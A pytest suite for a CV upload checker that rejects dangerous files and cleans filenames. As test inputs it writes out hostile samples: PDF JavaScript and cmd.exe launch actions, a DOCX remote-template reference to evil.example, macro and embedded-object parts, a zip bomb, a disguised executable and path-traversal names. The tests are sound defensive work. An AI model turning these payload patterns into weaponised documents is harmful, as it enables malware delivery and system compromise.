"""CV upload safety checks."""
from __future__ import annotations

import pytest

from careers import config
from careers.conftest import doc_bytes, docx_bytes, pdf_bytes
from careers.filecheck import FileRejected, check_cv, sanitise_filename

DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"


def _code(name, mime, data):
    with pytest.raises(FileRejected) as e:
        check_cv(name, mime, data)
    return e.value.code


def test_plain_pdf_passes():
    f = check_cv("Jane CV.pdf", "application/pdf", pdf_bytes())
    assert f.ext == "pdf" and f.mime == "application/pdf" and len(f.sha256) == 64


def test_plain_docx_and_doc_pass():
    assert check_cv("cv.docx", DOCX, docx_bytes()).ext == "docx"
    assert check_cv("cv.doc", "application/msword", doc_bytes()).ext == "doc"


def test_generic_mobile_mime_is_tolerated():
    assert check_cv("cv.pdf", "application/octet-stream", pdf_bytes()).ext == "pdf"
    assert check_cv("cv.pdf", "", pdf_bytes()).ext == "pdf"


@pytest.mark.parametrize("name", ["cv.exe", "cv.pdf.exe", "cv.docm", "cv.rtf", "cv", "cv.PNG"])
def test_unsupported_extensions(name):
    assert _code(name, "application/octet-stream", pdf_bytes()) == "bad_type"


def test_mime_must_match_extension():
    assert _code("cv.pdf", "image/png", pdf_bytes()) == "bad_type"
    assert _code("cv.docx", "application/pdf", docx_bytes()) == "bad_type"


def test_signature_must_match_extension():
    # An executable renamed to .pdf, and a PDF renamed to .docx.
    assert _code("cv.pdf", "application/pdf", b"MZ\x90\x00" + b"\x00" * 200) == "bad_signature"
    assert _code("cv.docx", DOCX, pdf_bytes()) == "bad_signature"
    assert _code("cv.doc", "application/msword", pdf_bytes()) == "bad_signature"


def test_empty_and_oversized():
    assert _code("cv.pdf", "application/pdf", b"") == "empty"
    big = pdf_bytes() + b"0" * (config.MAX_CV_BYTES + 1)
    assert _code("cv.pdf", "application/pdf", big) == "too_large"


def test_exactly_10mb_is_allowed():
    data = pdf_bytes()
    data += b"%" * (config.MAX_CV_BYTES - len(data))
    assert check_cv("cv.pdf", "application/pdf", data).size == config.MAX_CV_BYTES


@pytest.mark.parametrize("extra", [
    b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>",
    b"/AA << /O << /S /Launch /F (cmd.exe) >> >>",
    b"/Names << /EmbeddedFiles << >> >> /EmbeddedFile",
    b"/OpenAction << /S /J#61vaScript >>",  # hex-escaped name
])
def test_pdf_active_content_rejected(extra):
    assert _code("cv.pdf", "application/pdf", pdf_bytes(extra)) == "active_content"


def test_pdf_ordinary_open_action_is_fine():
    # A plain "open at page 1" action is common in exported CVs.
    assert check_cv("cv.pdf", "application/pdf",
                    pdf_bytes(b"/OpenAction [3 0 R /Fit]")).ext == "pdf"


def test_docx_with_macros_rejected():
    assert _code("cv.docx", DOCX, docx_bytes({"word/vbaProject.bin": b"x"})) == "active_content"
    ct = (b'<Types><Override PartName="/word/document.xml" ContentType="application/'
          b'vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
    assert _code("cv.docx", DOCX, docx_bytes(content_types=ct)) == "active_content"


def test_docx_with_embedded_objects_rejected():
    assert _code("cv.docx", DOCX, docx_bytes({"word/embeddings/oleObject1.bin": b"x"})) \
        == "active_content"
    assert _code("cv.docx", DOCX, docx_bytes({"word/activeX/activeX1.xml": b"x"})) \
        == "active_content"


def test_docx_remote_template_rejected():
    rels = (b'<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
            b'officeDocument/2006/relationships/attachedTemplate" '
            b'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    assert _code("cv.docx", DOCX, docx_bytes(rels=rels)) == "active_content"


def test_docx_zip_bomb_rejected():
    bomb = docx_bytes({"word/media/pad.bin": b"\x00" * (70 * 1024 * 1024)})
    assert len(bomb) < config.MAX_CV_BYTES
    assert _code("cv.docx", DOCX, bomb) == "suspicious"


def test_docx_that_is_just_a_zip_rejected():
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("payload.exe", b"MZ")
    assert _code("cv.docx", DOCX, buf.getvalue()) == "bad_signature"


def test_doc_with_macros_rejected():
    assert _code("cv.doc", "application/msword", doc_bytes(with_macros=True)) == "active_content"


@pytest.mark.parametrize("raw,clean", [
    ("../../etc/passwd.pdf", "passwd.pdf"),
    ("C:\\Users\\me\\My CV (final).pdf", "My CV _final_.pdf"),
    ("Zoë   Tan<script>.docx", "Zoe Tan_script_.docx"),
    ("....pdf", "pdf"),
    ("", "cv"),
])
def test_sanitise_filename(raw, clean):
    assert sanitise_filename(raw) == clean


def test_sanitise_filename_keeps_extension_when_truncating():
    out = sanitise_filename("a" * 200 + ".docx")
    assert len(out) <= 80 and out.endswith(".docx")
